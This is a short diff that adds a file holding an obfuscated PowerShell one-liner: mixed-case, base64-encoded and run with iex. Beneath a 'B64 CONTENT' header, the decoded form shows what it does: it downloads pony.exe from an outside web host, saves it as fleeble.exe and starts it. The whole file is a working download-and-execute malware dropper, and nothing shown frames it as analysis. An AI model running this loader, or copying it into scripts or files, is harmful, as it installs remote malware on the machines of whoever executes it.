@@ -1,0 +1,7 @@
+iex([SYsTem.tEXt.ENCodIng]::uTF8.GETstrIng([SYsteM.cONVeRt]::fromBAse64sTriNg('CihOZXctT2JqZWN0IFN5c3RFbS5uRXQuV0VCQ2xJRW5UKS5Eb3dObE9BREZpTEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vcG9ueS5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SystEm.nEt.WEBClIEnT).DowNlOADFiLE('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
